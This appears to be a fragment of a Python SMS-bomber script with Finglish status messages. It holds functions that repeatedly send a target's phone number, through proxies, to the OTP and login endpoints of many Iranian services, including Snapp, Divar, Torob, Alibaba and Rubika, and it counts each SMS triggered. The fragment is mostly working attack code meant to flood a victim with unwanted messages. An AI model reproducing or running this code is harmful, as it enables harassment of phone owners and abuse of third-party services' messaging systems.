...
def snap(phone):
    ...
    try:
        snapR = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in snapR.text:
            global count
            count += 1
            print (f"\033[0;36m[{timee}]\033[0;94mSMS ersal shod :)")
        else:
            print (f"\033[0;36m[{timee}]\033[0;91mmoshkel ! ersal nashod")
    except:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        print (f"\033[0;36m[{timee}]\033[0;91mmoshkel ! ersal nashod")
...
def shad(phone):
    ...
    try:
        shadR = post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in shadR.text:
            global count
...
def gap(phone):
    ...
    try:
        gapR = get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in gapR.text:
            global count
...
def tap30(phone):
    ...
    try:
        tap30R = post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def emtiaz(phone):
    ...
    try:
        emR = post("https://web.emtiyaz.app/json/login", headers=emH, data=emD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        global count
        count += 1
...
def divar(phone):
    ...
    try:
        divarR = post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def rubika(phone):
    ...
    try:
        ruR = post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "OK" in ruR.text:
            global count
...
def torob(phone):
    ...
    try:
        torobR = get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def bama(phone):
    ...
    try:
        bamaR = post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        if "0" in bamaR.text:
            global count
...
def snapfood(phone):
    ...
    try:
        sfoodR = post('https://snapfood.ir/customer/app-dl/send', headers=sfoodH, data=sfoodD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def sheypoor(phone):
    ...
    try:
        sheyporR = post('https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def alibaba(phone):
    ...
    try:
        alibabaR = post('https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def smarket(phone):
    ...
    try:
        smarketR = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={smarketD}', headers=smarketH, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def arka(phone):
    ...
    try:
        arkaR = post('https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD, proxies=proxy)
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
...
def sTrip(phone):
    ...
    try:
        ...
        if sTripR.text[landis] == '2':
            global count
            count += 1
            print(print(f'\033[0;36m[{timee}]\033[0;94mSMS ersal shod :)'))
        else:
            print(f'\033[0;36m[{timee}]\033[0;91mmoshkel ! ersal nashod')
    except:
        now = datetime.now()
